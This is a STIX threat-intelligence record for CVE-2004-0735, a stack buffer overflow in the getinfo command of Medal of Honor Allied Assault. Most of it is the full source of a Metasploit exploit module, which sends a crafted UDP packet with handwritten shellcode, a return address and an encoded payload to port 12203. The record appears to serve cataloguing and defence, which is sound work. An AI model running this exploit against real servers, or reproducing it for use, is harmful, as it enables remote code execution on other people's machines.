{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9287625e-2c85-4cb1-973c-08eaafe06805",
    "created": "2024-08-14T16:39:42.779673Z",
    "modified": "2024-08-14T16:39:42.779685Z",
    "name": "Medal of Honor Allied Assault getinfo Stack Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in the getinfo command of Medal Of Honor Allied Assault. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/games/mohaa_getinfo.rb",
            "external_id": "mohaa_getinfo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0735"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Medal of Honor Allied Assault getinfo Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in the getinfo\n        command of Medal Of Honor Allied Assault.\n      },\n      'Author'         => [ 'Jacopo Cervini' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0735'],\n          [ 'OSVDB', '8061' ],\n          [ 'EDB', '357'],\n          [ 'BID', '10743'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 512,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Medal Of Honor Allied Assault v 1.0 Universal', { 'Rets' => [ 111, 0x406957 ] }], # call ebx\n        ],\n      'DisclosureDate' => '2004-07-17',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(12203)\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    # We should convert this to metasm - Patrick\n    buf = 'B' * target['Rets'][0]\n    buf << \"\\x68\\x76\\x76\\x76\\x76\"*9   \t# PUSH 76767676 x 9\n    buf << \"\\x68\\x7f\\x7f\\x7f\\x7f\"     \t# PUSH 7F7F7F7F\n    buf << \"\\x57\"\t\t\t    \t# PUSH EDI\n    buf << \"\\x58\"\t\t\t    \t# POP EAX\n    buf << \"\\x32\\x64\\x24\\x24\"\t    \t# XOR AH,BYTE PTR SS:[ESP+24]\n    buf << \"\\x32\\x24\\x24\"\t\t    \t# XOR AH,BYTE PTR SS:[ESP]\n    buf << \"\\x48\"*150\t\t\t    \t# DEC EAX x 150\n    buf << \"\\x50\\x50\"\t\t\t    \t# PUSH EAX x 2\n    buf << \"\\x53\"\t\t\t\t# PUSH EBX\n    buf << \"\\x58\"\t\t\t\t# POP EAX\n    buf << \"\\x51\"\t\t\t\t# PUSH ECX\n    buf << \"\\x32\\x24\\x24\"\t\t\t# XOR AH,BYTE PTR SS:[ESP]\n    buf << \"\\x6a\\x7f\"\t\t\t\t# PUSH 7F\n    buf << \"\\x5e\"\t\t\t\t# POP ESI\n    buf << \"\\x46\"*37\t\t\t\t# INC ESI\n    buf << \"\\x56\"*10\t\t\t\t# PUSH ESI\n    buf << \"\\x32\\x44\\x24\\x24\"\t\t# XOR AL,BYTE PTR SS:[ESP+24]\n    buf << \"\\x49\\x49\"\t\t\t\t# DEC ECX\n    buf << \"\\x31\\x48\\x34\"\t\t\t# XOR DWORD PTR DS:[EAX+34],ECX\n    buf << \"\\x58\"*11\t\t\t\t# POP EAX\n    buf << \"\\x42\"*66\n    buf << \"\\x3c\"*4\n    buf << \"\\x42\"*48\n    buf << [ target['Rets'][1] ].pack('V')\n\n    req = \"\\xff\\xff\\xff\\xff\\x02\" + \"getinfo \" + buf\n    req << \"\\r\\n\\r\\n\" + make_nops(32) + payload.encoded\n\n    udp_sock.put(req)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}